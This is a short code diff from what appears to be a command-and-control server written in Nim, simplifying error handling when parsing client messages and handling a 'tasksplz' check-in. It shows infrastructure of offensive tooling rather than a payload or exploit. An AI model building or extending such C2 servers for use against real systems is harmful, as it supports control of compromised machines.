@@ -60,13 +60,10 @@ proc processMessages(server: C2Server, tcpListener: TCPListener, tcpSocket: TCPS
     inc linesRecv
 
     msgS &= line
-
     var response: JsonNode
     try:
       response = parseJson(decode(msgS))
-    except ValueError:
-      continue
-    except JsonParsingError: 
+    except: 
       if msgS == "tasksplz":
         client.lastCheckin = now()
         msgS = ""
